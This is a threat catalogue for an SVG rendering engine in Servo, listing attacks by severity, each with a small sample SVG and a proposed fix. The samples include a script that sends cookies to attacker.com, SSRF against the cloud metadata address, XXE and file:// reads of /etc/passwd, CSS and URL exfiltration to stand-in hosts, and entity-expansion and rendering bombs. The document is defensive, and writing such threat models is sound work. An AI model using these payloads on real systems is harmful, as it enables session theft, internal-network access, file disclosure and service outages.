# SVG Security Threats — `svg_engine`

A catalog of attack vectors against the SVG rendering pipeline, ordered by
severity (most critical first). Each entry describes what the attacker achieves,
gives a minimal example, and tags the layer it lives in — plus the idea for how
to fix it.

**How to read this file**

- **Layer** — where the risk lives:
  - `engine` — inside `svg_engine` (this crate).
  - `parser` — in the XML parser / Stylo cascade, upstream of this crate.
  - `deployment` — in how the SVG is hosted, served, or uploaded.
- **Status** — current posture in Servo:
  - `covered` — a guard exists.
  - `not covered` — no guard.
  - `upstream` — handled (or not) outside `svg_engine`.
  - `out of scope` — the engine doesn't do this today.
- **Fix** — the mitigation idea: an engine-side guard to add, an upstream
  (parser) action, or a deployment (hosting/serving) control. DoS fixes list
  concrete numbers as *suggested starting limits*, not current behavior.

The engine is **not a security boundary** (see the main
[README §4](README.md)); this document is a taxonomy of *what exists*, not a
claim that the engine defends against it.

## Priority overview

| # | Category | Severity | Layer | Servo status |
|---|----------|----------|-------|--------------|
| 1 | Remote Code Execution (RCE) | Critical | `engine`/`parser` | mitigated by Rust; residual `unsafe`/FFI |
| 2 | Cross-Site Scripting (XSS) | Critical | `deployment` | out of scope (no script execution) |
| 3 | Server-Side Request Forgery (SSRF) | High | `engine` | not covered (`image href` is resolved) |
| 4 | Information Disclosure (file read) | High | `parser`/`engine` | not covered (XXE upstream; `file://` image) |
| 5 | Data Exfiltration | High | `deployment`/`engine` | not covered |
| 6 | Denial of Service (DoS) | Medium | `engine`/`parser` | mostly not covered |
| 7 | Other web threats | Low–Medium | `deployment` | out of scope |

> **What is actually live in Servo today:** RCE is mitigated by Rust and XSS is
> out of scope (the engine never executes scripts). The genuinely relevant ones
> are **SSRF** and **file disclosure** via `image href` URLs, **data
> exfiltration** via those same URLs, and the **DoS** vectors (only `<use>`
> cycles are guarded). The rest matter only if the engine is ever fed untrusted
> or uploaded SVG.

---

## 1. Remote Code Execution (RCE) — memory corruption

*Layer: `engine`/`parser` · Severity: Critical · CWE-787 / CWE-94*

Malformed input exploits a **memory-safety bug** (not overload) in the XML
parser, path parser, tessellator, or rasterizer to execute arbitrary code. This
is distinct from DoS: the engine crashes *and* the attacker gains control.

```svg
<!-- illustrative: a crafted malformed document that trips a parser bug -->
<svg><use href="…"/> <?malformed processing instruction … ?></svg>
```

- **Known real cases:** [CVE-2010-1403](https://ubuntu.com/security/CVE-2010-1403) — WebKit read uninitialized memory on a malformed `<use>`/processing instruction → RCE (CVSS 9.3); [CVE-2008-3529](https://ubuntu.com/security/CVE-2010-1403) — libxml2 heap overflow.
- **Servo status:** `engine` memory bugs are largely eliminated by Rust, but the residual surface is `unsafe` code and FFI (font rasterization, image decode, `kurbo`, `vello_cpu`).
- **Fix:** keep the `unsafe`/FFI surface fuzzed (cargo-fuzz / OSS-Fuzz over the path parser, tessellator, and rasterizer) and audit every `unsafe` block; treat a Rust panic in these paths as a bug to fix, not a crash to swallow.

## 2. Cross-Site Scripting (XSS) — active content

*Layer: `deployment` · Severity: Critical · CWE-79*

SVG is XML and can carry executable content that runs in the **host page's
origin** when the SVG is rendered inline. The dominant delivery model is
**stored XSS via SVG upload** (an unsanitized upload served back inline).

**`<script>` element**
```svg
<svg xmlns="http://www.w3.org/2000/svg">
  <script>fetch('https://attacker.com?c='+document.cookie)</script>
</svg>
```
- **Fix:** sanitizer strips `<script>` on upload; the engine already never executes scripts; serve with CSP `script-src 'none'`.

**Event handlers**
```svg
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">
  <rect onmouseover="…" onclick="…"/>
</svg>
```
- **Fix:** sanitizer strips all `on*` attributes; the engine ignores event attributes by design.

**`<foreignObject>` — embeds HTML / scripts / iframes**
```svg
<svg xmlns="http://www.w3.org/2000/svg">
  <foreignObject><body><img src=x onerror=alert(1)></body></foreignObject>
</svg>
```
- **Fix:** keep `<foreignObject>` off the supported-element whitelist; sanitizer strips it from uploads.

**`javascript:` URLs**
```svg
<svg><a href="javascript:alert(1)"><text>click</text></a></svg>
```
- **Fix:** sanitizer neutralizes `javascript:`/`data:text/html` hrefs; the engine does not render `<a>` navigation.

**SVG animation (SMIL)**
```svg
<svg><rect><animate attributeName="fill" from="red" to="blue" dur="1s"/></rect></svg>
```
- **Fix:** keep SMIL (`<animate>`, `<set>`, `<animateTransform>`) unsupported; sanitizer strips it from uploads.

**Stored XSS — the delivery model** *(cuts across all of the above)*
- **Fix:** sanitize at upload, serve with `Content-Type: image/svg+xml` + `X-Content-Type-Options: nosniff` + CSP, and render untrusted SVG only via `<img>`/sandboxed `<iframe>` — never inline in the trusted document.

- **Known real cases:** [Shopware CVE-2026-48015](https://dependabot.ecosyste.ms/advisories/CVE-2026-48015), [Laravel-Mediable CVE-2026-49971](https://www.vulncheck.com/advisories/laravel-mediable-stored-xss-via-svg-file-upload), [DataEase](https://github.com/dataease/dataease/security/advisories/GHSA-wx8m-vf8v-crvr/), Bagisto, SveltyCMS, AMP-for-WP.
- **Servo status:** `out of scope` — the engine executes no scripts or events, and `<foreignObject>`/`<a>`/SMIL are not in the supported whitelist. This becomes the **#1 concern** only if the engine ever renders untrusted/uploaded SVG inline.

## 3. Server-Side Request Forgery (SSRF)

*Layer: `engine` · Severity: High · CWE-918*

The renderer fetches a URL the attacker controls, reaching internal or
network-only endpoints (cloud metadata, internal services).

**Remote `<image>` fetch**
```svg
<svg><image href="http://169.254.169.254/latest/meta-data/" width="100" height="100"/></svg>
```
- **Fix:** add an engine-side URL allowlist at image resolution — allow only same-origin / `data:` / `blob:`; reject `http(s)://` and `file://` unless the caller explicitly opts in.

**External stylesheet / `@import`**
```svg
<svg><style>@import url("http://169.254.169.254/…");</style></svg>
```
- **Fix:** strip external `@import`/`url()` from SVG `<style>` (sanitize), or route them through the same fetch allowlist.

**External font (`@font-face`)**
```svg
<svg><style>@font-face { font-family:x; src:url("http://internal/…"); }</style></svg>
```
- **Fix:** block external `@font-face src` fetches via the same allowlist; fall back to system fonts.

- **Servo status:** `not covered` — `<image href>` is resolved at build time. If remote URLs aren't blocked by the caller, SSRF is live.

## 4. Information Disclosure — file read

*Layer: `parser`/`engine` · Severity: High · CWE-611 (XXE)*

Read local files and leak their contents into the document.

**XXE external entities** *(parser-level)*
```xml
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg><text>&xxe;</text></svg>
```
- **Fix:** disable external-entity/DTD resolution in the XML parser (upstream — verify Servo's parser neither loads external DTDs nor expands external entities).

**Local file inclusion via `file://` URL**
```svg
<svg><image href="file:///etc/passwd" width="100" height="100"/></svg>
```
- **Fix:** reject the `file://` scheme in image/CSS URL resolution (same allowlist as SSRF).

- **Servo status:** XXE is `upstream` (Servo's XML parser); the `file://` `<image>` URL is `not covered` and must be blocked by the caller.

## 5. Data Exfiltration

*Layer: `deployment`/`engine` · Severity: High · CWE-200*

Leak data out of the host. Two distinct vectors:

**CSS injection — attribute selectors + `url()`** *(leaks host-document data)*
```svg
<svg><style>
  input[value^="a"] { background: url(https://attacker.com/?v=a); }
</style></svg>
```
- **Fix:** sanitize SVG `<style>` — strip external `url()`/`@import` or whitelist declarations; render SVG in an origin-isolated context so its CSS can't touch host-DOM data.

**External URL in an attribute** *(sends a known secret)*
```svg
<svg><image href="https://attacker.com/collect?d=SECRET" width="1" height="1"/></svg>
```
- **Fix:** same URL allowlist — block external URLs, or don't resolve external references at all.

- **Known real cases:** [CVE-2026-40301](https://github.com/advisories/GHSA-93vf-569f-22cq) (SVG `<style>` passes `url()`/`@import` unfiltered), [Snipe-IT CVE-2026-86738](https://vuldb.com/cve/CVE-2026-86738), [PortSwigger blind CSS exfiltration](https://portswigger.net/research/blind-css-exfiltration).
- **Servo status:** CSS injection is `upstream` (Stylo cascade); the attribute-URL vector is `not covered`.

## 6. Denial of Service (DoS) — resource exhaustion

*Layer: `engine`/`parser` · Severity: Medium · CWE-400 (and CWE-409 for decompression)*

Crash, hang, or OOM the renderer. These steal nothing and run nothing, but they
are the most numerous and the most directly relevant to the engine. The numbers
below are **suggested starting limits** — none are implemented yet.

### 6.1 Recursion → stack overflow

**Deep nesting**
```svg
<svg><g><g><g> <!-- …100,000 nested <g>… --> </g></g></g></svg>
```
- **Fix:** cap element nesting depth (e.g. max 512).

**Deep acyclic `<use>` chain**
```svg
<svg>
  <g id="l0"><rect/></g>
  <g id="l1"><use href="#l0"/></g>
  <g id="l2"><use href="#l1"/></g>
  <!-- …×100,000… -->
  <use href="#l100000"/>
</svg>
```
- **Fix:** cap `<use>` resolution depth (e.g. max 256), alongside the existing cycle set.

### 6.2 `<use>` cycles

**Direct self-cycle** — `covered` (cycle detection)
```svg
<svg><g id="a"><use href="#a"/></g></svg>
```
- **Fix:** already in place — the `resolving` path-set stops the cycle; keep it.

**Indirect cycle** — `covered` (cycle detection)
```svg
<svg><g id="l1"><use href="#l2"/></g><g id="l2"><use href="#l1"/></g></svg>
```
- **Fix:** already in place; keep.

### 6.3 `<use>` amplification

**Billion-laughs fan-out (exponential)**
```svg
<svg>
  <g id="l0"><rect/></g>
  <g id="l1"><use href="#l0"/><use href="#l0"/></g>
  <g id="l2"><use href="#l1"/><use href="#l1"/></g>
  <!-- …×30 levels → 2^30 ≈ 1 billion rects… -->
</svg>
```
- **Fix:** cap the total expanded node count after `<use>` resolution (e.g. max 100,000).

**Quadratic blow-up**
```svg
<svg>
  <g id="l1"><rect/></g>
  <g id="l2"><use href="#l1"/><rect/></g>
  <g id="l3"><use href="#l2"/><rect/></g>
  <!-- …×10,000 levels → ~50M rects… -->
</svg>
```
- **Fix:** same total expanded-node cap.

**Command amplification (big-but-legit subtree)**
```svg
<svg>
  <symbol id="icon"><rect width="1" height="1"/> <!-- …1000 shapes… --> </symbol>
  <use href="#icon" x="0"/> <use href="#icon" x="1"/> <!-- …×10,000 uses… -->
</svg>
```
- **Fix:** cap the number of `<use>` instances (e.g. max 10,000) in addition to the node-count cap.

### 6.4 Geometry & rendering bombs

**Huge canvas / `viewBox` → OOM**
```svg
<svg width="100000" height="100000"><rect width="100000" height="100000"/></svg>
```
- **Fix:** keep the `u16` side cap, and add a pixel-area cap (e.g. max 2²⁸ ≈ 268 M px); reject larger viewports up front.

**Unclamped blur `stdDeviation`**
```svg
<svg><filter id="b"><feGaussianBlur stdDeviation="1000000"/></filter>
<rect width="100" height="100" filter="url(#b)"/></svg>
```
- **Fix:** clamp `feGaussianBlur` `stdDeviation` (e.g. [0, 1000], or ≤ the filter region size).

**Huge path segment count → tessellation blowup**
```svg
<svg><path d="M0,0 L1,1 L2,2 L3,3 <!-- …1,000,000 segments… -->"/></svg>
```
- **Fix:** cap the `d` command/segment count (e.g. max 100,000).

**Excessive element count**
```svg
<svg> <!-- 500,000 × <rect/> --> </svg>
```
- **Fix:** cap total element count (e.g. max 100,000).

**Recursive paint server (pattern)**
```svg
<svg><pattern id="p" width="10" height="10"><rect width="10" height="10" fill="url(#p)"/></pattern>
<rect width="100" height="100" fill="url(#p)"/></svg>
```
- **Fix:** cap paint-server reference depth (e.g. max 16 nested `url(#…)` resolutions).

**Extreme stroke / dash values**
```svg
<svg><path d="M0,0 L1000,1000" stroke="black" stroke-width="1000000" stroke-dasharray="1 1000000"/></svg>
```
- **Fix:** clamp `stroke-width` (e.g. ≤ 10,000) and bound `stroke-dasharray` length/value range.

### 6.5 Parser-level DoS

**Billion-laughs / XML entity expansion** *(parser-level)*
```xml
<!DOCTYPE svg [
  <!ENTITY a "xxxxxxxxxx">
  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
  <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
  <!-- …×10 levels → 10^10 chars… -->
]>
<svg>&c;</svg>
```
- **Fix:** parser-level entity-expansion limits (libxml2-style caps) — verify Servo's XML parser applies them.

**Decompression bomb (SVGZ / gzip)** *(CWE-409)*
A tiny gzip'd SVG expanding to an enormous size on decompression.
Reference: [CrImage decompression-bomb protection](https://github.com/naqvis/crimage/blob/main/guide/DECOMPRESSION_BOMB_PROTECTION.md) (defaults 1000:1 ratio, 500 MB cap).
- **Fix:** `not applicable` today (no SVGZ input); if gzip input is ever added, cap decompressed size + ratio (e.g. 1000:1, 500 MB).

- **Servo status:** only `<use>` cycle detection is `covered`; every other DoS vector is `not covered`. Entity expansion and decompression are `upstream`/`not applicable`.

## 7. Other web threats

*Layer: `deployment` · Severity: Low–Medium*

**Open redirect / phishing** — CWE-601
```svg
<svg><a href="https://phishing.example"><text>click here</text></a></svg>
```
- **Fix:** sanitizer removes/neutralizes `<a href>`; the engine does not render links.

**MIME / content-type confusion**
Serving an SVG with a non-SVG content type (e.g. `text/html`), or trusting a
client-supplied `Content-Type`, causes the active content to execute. (See
[ech0 GHSA-69HX-63PV-F8F4](https://vulnerability.circl.lu/vuln/ghsa-69hx-63pv-f8f4#1).)
- **Fix:** serve SVG as `image/svg+xml` with `X-Content-Type-Options: nosniff` and CSP; never sniff SVG as HTML.

**DOM clobbering**
SVG elements named `id="location"` / `id="cookie"` shadow global JS variables.
```svg
<svg><a id="location" href="https://attacker.com">…</a></svg>
```
- **Fix:** render untrusted SVG in `<img>`/sandboxed `<iframe>`, not inline in the trusted document.

**Privacy / tracking**
A 1×1 SVG tracking pixel, or external-resource timing used for fingerprinting.
```svg
<svg width="1" height="1"><image href="https://tracker.example/pixel.svg"/></svg>
```
- **Fix:** block external fetches by default (the same URL allowlist), so no third-party request can be triggered.

- **Servo status:** all `out of scope` — these live in the host/serving layer, not in `svg_engine`.

---

## Status summary

| Threat | Servo posture |
|--------|---------------|
| RCE (memory corruption) | mitigated by Rust; residual `unsafe`/FFI to audit |
| XSS (active content) | out of scope — no script execution; `foreignObject`/`a`/SMIL unsupported |
| SSRF (`image href`, CSS `@import`, fonts) | not covered — caller must block remote URLs |
| Information disclosure (XXE, `file://`) | XXE upstream; `file://` image not covered |
| Data exfiltration (CSS, URL) | CSS upstream; URL vector not covered |
| DoS (recursion/amplification/bombs) | only `<use>` cycles covered |
| Other (redirect, MIME, clobbering, tracking) | out of scope |
